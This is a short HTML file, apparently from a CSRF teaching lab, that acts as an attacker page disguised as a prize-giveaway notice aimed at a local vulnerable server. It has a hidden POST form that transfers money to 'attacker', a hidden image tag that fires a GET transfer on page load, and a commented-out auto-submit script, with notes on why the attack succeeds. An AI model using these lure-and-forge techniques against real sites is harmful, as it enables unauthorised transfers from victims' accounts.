<!DOCTYPE html>
<!-- attacker.html - CSRF 공격 페이지 -->
<!-- 이 파일은 http://localhost:8888/attacker.html 에서 접근합니다 -->
<!--
    CSRF 공격이 가능한 이유:
    1. 취약한 서버에 CSRF 토큰이 없음
    2. localhost에서는 다른 포트(8888→5001)도 same-site로 취급됨
       (SameSite=Lax여도 same-site이면 쿠키 전송됨)
    3. /transfer 엔드포인트가 GET/POST 모두 허용하여 다양한 공격 벡터 존재
-->
<html>
<head>
    <meta charset="UTF-8">
    <title>경품 이벤트</title>
</head>
<body>
<h1>축하합니다! 경품에 당첨되었습니다!</h1>
<p>아래 버튼을 클릭하면 경품이 지급됩니다.</p>

<!-- 공격 1: 버튼 클릭 유도 (숨겨진 POST 폼) -->
<form id="csrf_form" action="http://localhost:5001/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="500">
    <button type="submit" style="font-size:20px; padding:10px 30px; cursor:pointer;">
        경품 수령하기
    </button>
</form>

<hr>

<!-- 공격 2: GET 기반 자동 공격 (이미지 태그) -->
<p style="color:gray; font-size:12px;">
    [공격자 메모] 아래 이미지 태그는 페이지 로드 시 자동으로 GET 요청을 보냅니다.
</p>
<img src="http://localhost:5001/transfer?to=attacker&amount=100" width="0" height="0" style="display:none;" alt="">

<hr>
<p style="color:gray; font-size:12px;">
    [공격자 메모] 아래 스크립트의 주석을 해제하면 페이지 로드 시 자동 송금됩니다.
</p>
<!-- 공격 3: 자동 제출 (주석 해제 시 페이지 열면 즉시 POST 송금) -->
<!--
<script>document.getElementById('csrf_form').submit();</script>
-->
</body>
</html>
